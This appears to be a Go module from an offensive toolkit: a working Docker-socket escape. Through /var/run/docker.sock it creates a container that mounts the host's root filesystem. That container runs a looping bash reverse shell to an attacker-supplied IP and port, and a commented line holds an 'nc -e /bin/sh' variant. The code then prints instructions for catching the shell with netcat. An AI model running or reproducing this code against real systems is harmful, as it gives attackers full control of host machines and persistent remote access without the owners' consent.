package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"strings"
)

func sendMessage(httpClient *http.Client, url string, method string, postData string) []byte{
	var response *http.Response
	var err error

	if method == "GET"{
		response, err = httpClient.Get(url)
	} else {
		response, err = httpClient.Post(url, "application/json", strings.NewReader(postData))
	}

	if err != nil {
		panic(err)
	}

	bodyBytes, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Fatal(err)
	}

	defer response.Body.Close()
	return bodyBytes
}

type ContainerCreationStatus struct {
	Id string `json:Id`
}
func createContainer(httpClient *http.Client, postData string){
	bodyBytes := sendMessage(httpClient, "http://v1.27/containers/create", "POST", postData)
	fmt.Println("[*] Container has been created, waiting to start...")
	//fmt.Println(string(bodyBytes))

	var containerCreationStatus ContainerCreationStatus
	err := json.Unmarshal(bodyBytes, &containerCreationStatus)
	if err != nil {
		log.Fatal(err)
	}

	url := fmt.Sprintf("http://v1.27/containers/%s/start", containerCreationStatus.Id)
	bodyBytes = sendMessage(httpClient, url, "POST", "")
	fmt.Println("[*] Container has been started")
	fmt.Printf("[*] Container ID: %s\n", containerCreationStatus.Id)
	fmt.Print(string(bodyBytes))

}
// https://gist.github.com/teknoraver/5ffacb8757330715bcbcc90e6d46ac74
func mainfunc(ipToConnect string, port string) {
	// The Run() function in ../pkg/modules/modules.go might return the IP and port with spaces, we clean it
	ipToConnect = strings.TrimSpace(ipToConnect)
	port = strings.TrimSpace(port)

	if port == "" {
		port = "6666"
	}

	httpc := http.Client{
		Transport: &http.Transport{
			DialContext: func(_ context.Context, _, _ string) (net.Conn, error) {
				return net.Dial("unix", "/var/run/docker.sock")
			},
		},
	}

	bodyBytes := sendMessage(&httpc, "http://host/containers/json", "GET", "")
	fmt.Println(string(bodyBytes))

	//postData := fmt.Sprintf(`{ "Detach":true, "AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Image":"alpine:latest", "HostConfig":{"Binds": ["/:/host"]}, "Cmd":["sh", "-c", "while true; do nc %s %s -e /bin/sh; sleep 2; done"] }`, ipToConnect, port)
	postData := fmt.Sprintf(`{ "Detach":true, "AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Image":"alpine:latest", "HostConfig":{"Binds": ["/:/host"]}, "Cmd":["sh", "-c", "apk update && apk add bash && bash -c 'while true; do bash -i >& /dev/tcp/%s/%s 0>&1; sleep 2; done'"] }`, ipToConnect, port)
	createContainer(&httpc, postData)

	fmt.Printf("[*] Listen to port %s on IP %s to get a shell (\"nc -lvp %s\")\n", port, ipToConnect, port)
	fmt.Printf("[*] The path to the host machine inside the container is /host\n")
	//io.Copy(os.Stdout, response.Body)
}

/*
func main(){
	mainfunc("192.168.1.1", "6666")
}
*/